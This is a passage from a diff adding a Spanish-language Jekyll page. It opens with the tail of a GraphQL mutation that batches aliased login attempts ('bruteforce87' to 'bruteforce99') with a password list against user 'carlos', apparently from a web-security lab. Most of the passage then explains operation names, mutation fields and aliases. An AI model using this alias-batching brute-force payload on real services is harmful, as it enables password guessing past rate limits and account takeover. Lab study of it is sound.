+  </span><span class="err">bruteforce</span><span class="mi">87</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"987654321"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">88</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"dallas"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">89</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"austin"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">90</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"thunder"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">91</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"taylor"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">92</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"matrix"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">93</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"mobilemail"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">94</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"mom"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">95</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"monitor"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">96</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"monitoring"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">97</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"montana"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">98</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"moon"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">99</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"moscow"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+
+</span></code></pre></div></div>
+
+<p>¡Entendido! Vamos a aclarar la diferencia entre el <strong>nombre de la operación</strong> y el <strong>nombre del campo mutación</strong> dentro de GraphQL. Este es un punto que puede ser confuso al principio, pero te lo explico paso a paso:</p>
+
+<hr />
+
+<h3 id="1-nombre-de-la-operación-mutation-login---"><strong>1. Nombre de la operación (<code class="language-plaintext highlighter-rouge">mutation login { ... }</code>)</strong></h3>
+<ul>
+  <li>
+    <p><strong>¿Qué es?</strong>
+Es el nombre que asignas a la operación completa (en este caso, a la mutación) para identificarla. Esto se coloca justo después de la palabra clave <code class="language-plaintext highlighter-rouge">mutation</code>.</p>
+  </li>
+  <li>
+    <p><strong>¿Para qué sirve?</strong>
+Ayuda al cliente o al servidor a identificar qué operación estás ejecutando, especialmente cuando envías múltiples operaciones en una misma solicitud.</p>
+  </li>
+  <li>
+    <p><strong>¿Es obligatorio?</strong></p>
+    <ul>
+      <li><strong>No siempre.</strong> Si no tienes varias operaciones en una sola solicitud, puedes omitir el nombre de la operación (se convierte en una operación <strong>anónima</strong>).</li>
+      <li>Sin embargo, algunos servidores o clientes (como los que usan <code class="language-plaintext highlighter-rouge">operationName</code>) requieren un nombre de operación explícito.</li>
+    </ul>
+  </li>
+</ul>
+
+<hr />
+
+<h3 id="2-nombre-del-campo-mutación-logininput---"><strong>2. Nombre del campo mutación (<code class="language-plaintext highlighter-rouge">login(input: { ... })</code>)</strong></h3>
+<ul>
+  <li>
+    <p><strong>¿Qué es?</strong>
+Es el <strong>nombre del campo en el esquema GraphQL</strong> que define la funcionalidad específica que deseas ejecutar. Este nombre debe coincidir con el nombre que aparece en el esquema del servidor.</p>
+
+    <p>Por ejemplo, en el esquema:</p>
+    <div class="language-graphql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">type</span><span class="w"> </span><span class="n">Mutation</span><span class="w"> </span><span class="p">{</span><span class="w">
+  </span><span class="n">login</span><span class="p">(</span><span class="n">input</span><span class="p">:</span><span class="w"> </span><span class="n">LoginInput</span><span class="p">!):</span><span class="w"> </span><span class="n">LoginResponse</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div>    </div>
+    <ul>
+      <li>El campo <code class="language-plaintext highlighter-rouge">login</code> es el nombre de la mutación que puedes usar.</li>
+      <li>Este nombre <strong>debe ser exactamente igual al definido en el esquema</strong>.</li>
+    </ul>
+  </li>
+  <li>
+    <p><strong>¿Para qué sirve?</strong>
+Es el nombre que el servidor usa para identificar qué lógica debe ejecutarse.</p>
+  </li>
+</ul>
+
+<hr />
+
+<h3 id="ejemplo-de-diferencia-entre-ambos"><strong>Ejemplo de diferencia entre ambos</strong></h3>
+
+<h4 id="con-nombre-de-operación"><strong>Con nombre de operación:</strong></h4>
+<div class="language-graphql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">mutation</span><span class="w"> </span><span class="n">loginOperation</span><span class="w"> </span><span class="p">{</span><span class="w">
+  </span><span class="n">login</span><span class="p">(</span><span class="n">input</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">username</span><span class="p">:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="p">:</span><span class="w"> </span><span class="s2">"123456"</span><span class="w"> </span><span class="p">})</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="n">token</span><span class="w">
+    </span><span class="n">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">loginOperation</code>: Nombre de la operación (puedes usar cualquier nombre aquí, es para ti y el cliente).</li>
+  <li><code class="language-plaintext highlighter-rouge">login</code>: Campo de la mutación definido en el esquema. Este <strong>debe coincidir</strong> con lo que el servidor espera.</li>
+</ul>
+
+<hr />
+
+<h4 id="con-operación-anónima"><strong>Con operación anónima:</strong></h4>
+<div class="language-graphql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">mutation</span><span class="w"> </span><span class="p">{</span><span class="w">
+  </span><span class="n">login</span><span class="p">(</span><span class="n">input</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">username</span><span class="p">:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="p">:</span><span class="w"> </span><span class="s2">"123456"</span><span class="w"> </span><span class="p">})</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="n">token</span><span class="w">
+    </span><span class="n">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<ul>
+  <li>Aquí no hay un nombre de operación, pero sigue funcionando porque <code class="language-plaintext highlighter-rouge">login</code> (el campo) está bien definido.</li>
+</ul>
+
+<hr />
+
+<h3 id="ejemplo-con-múltiples-operaciones"><strong>Ejemplo con múltiples operaciones</strong></h3>
+<p>Cuando necesitas enviar múltiples operaciones, debes darles nombres únicos a cada una:</p>
+
+<div class="language-graphql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">mutation</span><span class="w"> </span><span class="n">multiLogin</span><span class="w"> </span><span class="p">{</span><span class="w">
+  </span><span class="n">attempt1</span><span class="p">:</span><span class="w"> </span><span class="n">login</span><span class="p">(</span><span class="n">input</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">username</span><span class="p">:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="p">:</span><span class="w"> </span><span class="s2">"123456"</span><span class="w"> </span><span class="p">})</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="n">token</span><span class="w">
+    </span><span class="n">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="n">attempt2</span><span class="p">:</span><span class="w"> </span><span class="n">login</span><span class="p">(</span><span class="n">input</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">username</span><span class="p">:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="p">:</span><span class="w"> </span><span class="s2">"password"</span><span class="w"> </span><span class="p">})</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="n">token</span><span class="w">
+    </span><span class="n">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<ul>
+  <li><strong><code class="language-plaintext highlighter-rouge">multiLogin</code></strong>: Nombre de la operación completa.</li>
+  <li><strong><code class="language-plaintext highlighter-rouge">attempt1</code> y <code class="language-plaintext highlighter-rouge">attempt2</code></strong>: Son alias, etiquetas únicas que asignas para diferenciar cada invocación de la misma mutación.</li>
+  <li><strong><code class="language-plaintext highlighter-rouge">login</code></strong>: Es el nombre del campo mutación en el esquema, que siempre debe coincidir.</li>
+</ul>
+
+<hr />
+
+<h3 id="errores-comunes"><strong>Errores comunes</strong></h3>
+
+<ol>
+  <li><strong>Confundir el nombre de la operación con el campo mutación:</strong>
+    <ul>
+      <li>El nombre de la operación es <strong>para el cliente y opcional</strong>.</li>
+      <li>El nombre del campo mutación <strong>debe coincidir con el esquema del servidor</strong>.</li>
+    </ul>
+
+    <p>Si escribes esto:</p>
+    <div class="language-graphql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">mutation</span><span class="w"> </span><span class="n">loginOperation</span><span class="w"> </span><span class="p">{</span><span class="w">
+  </span><span class="n">login2</span><span class="p">(</span><span class="n">input</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">username</span><span class="p">:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="p">:</span><span class="w"> </span><span class="s2">"123456"</span><span class="w"> </span><span class="p">})</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="n">token</span><span class="w">
+    </span><span class="n">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div>    </div>
+    <p>Fallará porque <code class="language-plaintext highlighter-rouge">login2</code> no existe en el esquema.</p>
+  </li>
+  <li>
+    <p><strong>Cambiar el nombre del campo mutación arbitrariamente:</strong>
+Solo puedes usar los nombres definidos en el esquema del servidor.</p>
+  </li>
+  <li><strong>No usar un nombre único cuando hay varias operaciones:</strong>
+Si tienes múltiples mutaciones y no les das alias únicos, no podrás diferenciarlas en la respuesta.</li>
+</ol>
+
+<hr />
+
+<h3 id="regla-básica"><strong>Regla básica</strong></h3>
+<ul>
+  <li><strong>Nombre de operación:</strong> Opcional y libre. Sirve para identificar una operación completa.</li>
+  <li><strong>Nombre del campo mutación:</strong> Obligatorio. Debe coincidir con lo definido en el esquema del servidor.</li>
+</ul>
+
+      <div class="footer">
+        <span class="muted">© 2025 · Generado con Jekyll</span>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
+
